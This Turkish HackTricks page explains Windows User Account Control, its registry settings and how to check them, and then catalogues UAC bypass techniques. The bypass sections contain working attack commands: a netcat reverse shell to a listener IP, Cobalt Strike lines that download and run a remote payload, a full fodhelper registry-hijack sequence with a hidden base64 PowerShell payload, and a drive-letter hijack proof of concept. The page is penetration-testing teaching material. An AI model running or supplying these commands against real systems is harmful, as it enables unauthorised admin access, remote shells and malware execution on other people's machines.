# UAC - Kullanıcı Hesabı Denetimi

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) Windows'ta **yükseltilmiş işlemler için bir onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviyeye** sahip bir program **sistemi tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkin olduğunda, uygulamalar ve görevler, bir yönetici bunlara yönetici düzeyinde erişim verme izni verene kadar her zaman **yönetici olmayan bir hesabın güvenlik bağlamı altında** çalışır. Bu, yöneticileri istemeden yapılan değişikliklerden koruyan bir kullanım kolaylığı özelliğidir, ancak bir güvenlik sınırı olarak değerlendirilmeyebilir.

Bütünlük seviyeleri hakkında daha fazla bilgi için:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC etkin olduğunda, bir yönetici kullanıcıya iki token verilir: normal işlemler için standart kullanıcı tokenı ve yönetici ayrıcalıkları içeren bir token.

Bu [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC'nin nasıl çalıştığını derinlemesine tartışır; oturum açma sürecini, kullanıcı deneyimini ve UAC mimarisini içerir. Yöneticiler, kuruluşlarına özgü olarak UAC'nin nasıl çalışacağını yerel düzeyde (secpol.msc kullanarak) yapılandırmak için güvenlik ilkelerini kullanabilirler veya Active Directory alanı ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtabilirler. Çeşitli ayarlar detaylı olarak [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) bölümünde tartışılmıştır. UAC için ayarlanabilecek 10 Grup İlkesi ayarı vardır. Aşağıdaki tablo ek ayrıntı sağlar:

| Grup İlkesi Ayarı                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Varsayılan Ayar                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Teorisi

Bazı programlar, kullanıcının **administrator grubuna** dahil olması durumunda **otomatik olarak autoelevated** olarak çalıştırılır. Bu ikili dosyaların _**Manifest**_ içinde _**autoElevate**_ seçeneği **True** olarak bulunur. Ayrıca bu ikili dosyanın **Microsoft tarafından imzalanmış** olması gerekir.

Birçok auto-elevate süreci, medium integrity (normal kullanıcı düzeyi ayrıcalıklarıyla) çalışan süreçlerden çağrılabilen **COM nesneleri veya RPC sunucuları** aracılığıyla **işlevsellik** sunar. COM (Component Object Model) ve RPC (Remote Procedure Call), Windows programlarının farklı süreçler arasında iletişim kurup fonksiyonları çalıştırmak için kullandığı yöntemlerdir. Örneğin, **`IFileOperation COM object`** dosya işlemlerini (kopyalama, silme, taşıma) yönetmek için tasarlanmıştır ve bir istem olmadan ayrıcalıkları otomatik olarak yükseltebilir.

Bazı kontrollerin gerçekleştirilebileceğini unutmayın; örneğin işlemin **System32 dizininden** çalıştırılıp çalıştırılmadığını kontrol etmek gibi. Bu tür kontroller, örneğin **explorer.exe'ye veya System32'de bulunan başka bir yürütülebilir dosyaya enjekte ederek** atlatılabilir.

Bu kontrolleri atlatmanın bir diğer yolu da **PEB'i değiştirmektir**. Windows'taki her sürecin bir Process Environment Block (PEB) vardır; bu blok, yürütülebilir yol gibi süreçle ilgili önemli verileri içerir. PEB'i değiştirerek, saldırganlar kendi kötü amaçlı süreçlerinin konumunu sahteleyebilir (spoof), böylece sürecin güvenilir bir dizinden (ör. system32) çalışıyormuş gibi görünmesini sağlayabilir. Bu sahte bilgi, COM nesnesini kullanıcıya bir istem göstermeden ayrıcalıkları otomatik olarak yükseltmesi için kandırır.

Ardından, **UAC'yi atlatmak** (medium integrity seviyesinden **high** seviyeye yükselmek) için bazı saldırganlar bu tür ikili dosyaları kullanarak **rastgele kod** çalıştırır; çünkü kod **High level integrity** sürecinden çalıştırılacaktır.

Bir ikilinin _**Manifest**_'ini kontrol etmek için Sysinternals'ın _**sigcheck.exe**_ aracını kullanabilirsiniz. (`sigcheck.exe -m <file>`) Ve süreçlerin **integrity level**'ını görmek için _Process Explorer_ veya _Process Monitor_ (Sysinternals) kullanabilirsiniz.

### UAC Kontrolü

UAC'nin etkin olup olmadığını doğrulamak için:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Eğer **`1`** ise UAC **etkin**, **`0`** ise veya kayıt yoksa UAC **devre dışı**.

Sonra **hangi seviye**nin yapılandırıldığını kontrol edin:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Eğer **`0`** ise, UAC herhangi bir istem göstermez (ör. **devre dışı**)
- Eğer **`1`** ise yönetici, binary'i yüksek haklarla çalıştırmak için **kullanıcı adı ve parola sorulur** (on Secure Desktop)
- Eğer **`2`** (**Always notify me**) UAC, yönetici yüksek ayrıcalıkla bir şey çalıştırmaya çalıştığında her zaman onay isteyecektir (on Secure Desktop)
- Eğer **`3`** `1` gibi ama Secure Desktop üzerinde gerekli değil
- Eğer **`4`** `2` gibi ama Secure Desktop üzerinde gerekli değil
- Eğer **`5`**(**varsayılan**) Windows olmayan binary'leri yüksek ayrıcalıklarla çalıştırmak için yöneticiden onay isteyecektir

Sonra, **`LocalAccountTokenFilterPolicy`** değerine bakmalısınız.\
Eğer değer **`0`** ise, yalnızca **RID 500** kullanıcısı (**built-in Administrator**) **UAC olmadan yönetici görevlerini** gerçekleştirebilir; eğer **`1`** ise **"Administrators"** grubundaki tüm hesaplar bunu yapabilir.

Ve son olarak **`FilterAdministratorToken`** anahtarının değerine bakın.\
Eğer **`0`** (varsayılan) ise **built-in Administrator hesabı** uzak yönetim görevlerini yapabilir; eğer **`1`** ise built-in Administrator hesabı uzak yönetim görevlerini **yapamaz**, ancak `LocalAccountTokenFilterPolicy` `1` ise yapabilir.

#### Özet

- Eğer `EnableLUA=0` veya **var değilse**, **hiç kimse için UAC yok**
- Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=1`**, **hiç kimse için UAC yok**
- Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=0`**, RID 500 (Built-in Administrator) için **UAC yok**
- Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=1`**, **herkes için UAC** var

Tüm bu bilgiler **metasploit** modülü ile toplanabilir: `post/windows/gather/win_privs`

Ayrıca kullanıcınızın gruplarını kontrol edebilir ve integrity level'ını görebilirsiniz:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Hedefe grafiksel erişiminiz varsa, UAC bypass oldukça basittir; UAC istemi göründüğünde sadece "Yes"e tıklayabilirsiniz

UAC bypass şu durumda gereklidir: **UAC etkin, süreciniz medium integrity bağlamında çalışıyor ve kullanıcı hesabınız administrators grubuna ait**.

Bahsetmek gerekir ki, UAC en yüksek güvenlik düzeyindeyse (Always), diğer düzeylerdeki (Default) durumlara göre **UAC'yi atlatmak çok daha zordur**.

### UAC disabled

Eğer UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**), **admin privileges ile bir reverse shell çalıştırabilirsiniz** (high integrity level) şöyle bir şey kullanarak:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Temel UAC "bypass" (tüm dosya sistemi erişimi)

Eğer Administrators grubunda olan bir kullanıcıyla bir shell'iniz varsa SMB (file system) üzerinden paylaşılan **C$'yi yerel olarak yeni bir sürücüye bağlayabilir** ve **dosya sistemi içindeki her şeye erişiminiz olur** (hatta Administrator'ın ev klasörüne).

> [!WARNING]
> **Görünüşe göre bu hile artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass ile cobalt strike

Cobalt Strike teknikleri yalnızca UAC maksimum güvenlik seviyesine ayarlı değilse çalışır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için birkaç modüle sahiptir.

### KRBUACBypass

Dokümantasyon ve araç: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) birkaç UAC bypass exploits'inin **derlemesidir**. UACME'yi **visual studio veya msbuild kullanarak derlemeniz gerektiğini** unutmayın. Derleme birkaç çalıştırılabilir dosya (ör. `Source\Akagi\outout\x64\Debug\Akagi.exe`) oluşturacaktır, hangi dosyaya ihtiyacınız olduğunu **bilmeniz gerekecek.**\
**Dikkatli olun** çünkü bazı bypass'lar **başka bazı programları tetikleyebilir** ve bunlar **kullanıcıyı** **uyarıp** bir şeylerin olduğunu fark etmesine neden olabilir.

UACME, **her tekniğin hangi build sürümünden itibaren çalışmaya başladığını** gösterir. Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca, [this](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfasını kullanarak build sürümlerinden Windows sürümü `1607`'yi elde edebilirsiniz.

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilen ikili `fodhelper.exe` modern Windows'ta otomatik olarak yükseltilir. Çalıştırıldığında, `DelegateExecute`'ı doğrulamadan aşağıdaki kullanıcı-başına registry yolunu sorgular. Oraya bir komut yerleştirmek, bir Medium Integrity process'in (kullanıcı Administrators ise) bir High Integrity process başlatmasına UAC prompt olmadan izin verir.

fodhelper tarafından sorgulanan registry yolu:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell adımları (payload'unu ayarla, sonra tetikle):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Mevcut kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/hoşgörülü olduğunda çalışır (Always Notify ile ekstra kısıtlamalar olan durumda değil).
- 64-bit Windows üzerinde 32-bit bir process'ten 64-bit PowerShell başlatmak için `sysnative` yolunu kullanın.
- Payload herhangi bir komut olabilir (PowerShell, cmd veya bir EXE yolu). Gizlilik için UI ile prompt oluşturmaktan kaçının.

#### More UAC bypass

**All** the techniques used here to bypass UAC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ çalışmalıdır)

### UAC Bypass with GUI

Eğer bir **GUI** erişiminiz varsa UAC istemini aldığınızda basitçe kabul edebilirsiniz; gerçekten bir bypass'a ihtiyacınız yoktur. Yani, GUI erişimi elde etmek UAC'yi atlatmanızı sağlar.

Ayrıca, eğer birisinin kullandığı (muhtemelen RDP ile) bir GUI oturumu elde ederseniz, orada yönetici olarak çalışan ve örneğin bir **cmd**'yi doğrudan tekrar UAC ile sorgulanmadan **as admin** olarak çalıştırabileceğiniz bazı araçlar vardır: [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.

### Noisy brute-force UAC bypass

Eğer gürültü yapmaktan çekinmiyorsanız, her zaman kullanıcı kabul edene kadar izin yükseltme isteyen [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir şeyi **çalıştırabilirsiniz**.

### Your own bypass - Basic UAC bypass methodology

Eğer **UACME**'ye bakarsanız, **çoğu UAC bypass'ının bir Dll Hijacking zafiyetini kötüye kullandığını** (çoğunlukla kötü amaçlı dll'yi _C:\Windows\System32_ içine yazma) görürsünüz. [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Autoelevate edecek bir binary bulun (çalıştırıldığında yüksek integrity level'da çalıştığını kontrol edin).
2. procmon ile **"NAME NOT FOUND"** olaylarını bulun; bunlar **DLL Hijacking** için zafiyetli olabilir.
3. Muhtemelen DLL'i bazı korumalı yolların içine (ör. C:\Windows\System32) **yazmanız** gerekecek; bu yerlere yazma izniniz olmayabilir. Bunu aşmak için kullanabilirsiniz:
1. **wusa.exe**: Windows 7,8 ve 8.1. CAB dosyasının içeriğini korumalı yollara çıkartmaya izin verir (çünkü bu araç yüksek integrity level'da çalıştırılır).
2. **IFileOperation**: Windows 10.
4. DLL'inizi korumalı yola kopyalayacak bir **script** hazırlayın ve zafiyetli ve autoelevated binary'i çalıştırın.

### Another UAC bypass technique

Bu teknik, bir **autoElevated binary**'nin **çalıştırılacak** **binary** veya **komut**'un **isim/yol** bilgisini registry'den **okumaya** çalışıp çalışmadığını izlemeden ibarettir (bu, binary'nin bu bilgiyi **HKCU** içinde araması durumunda daha ilginçtir).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” shadow-admin token'ları ile oturum başına `\Sessions\0\DosDevices/<LUID>` map'leri kullanır. Dizin, ilk `\??` çözümlemesinde `SeGetTokenDeviceMap` tarafından tembelce oluşturulur. Eğer saldırgan shadow-admin token'ını yalnızca **SecurityIdentification** aşamasında taklit ederse, dizin saldırganı **owner** olarak oluşturulur (`CREATOR OWNER` miras alınır), bu da `\GLOBAL??` üzerinde öncelik alan sürücü-harf linklerine izin verir.

**Steps:**

1. Düşük ayrıcalıklı bir oturumdan, prompt'suz bir shadow-admin `runonce.exe` spawn etmek için `RAiProcessRunOnce` çağırın.
2. Bunun primary token'ını bir **identification** token'ına duplicate edin ve `\??`'yi açarken onu taklit ederek `\Sessions\0\DosDevices/<LUID>`'nin saldırgan sahipliğinde oluşturulmasını zorlayın.
3. Orada saldırgan kontrollü depolamaya işaret eden bir `C:` symlink oluşturun; o oturumdaki sonraki dosya sistemi erişimleri `C:`'yi saldırgan yoluna çözecek ve UAC prompt olmadan DLL/dosya hijack'e imkan verecektir.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Kaynaklar
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – User Account Control nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass teknikleri koleksiyonu](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
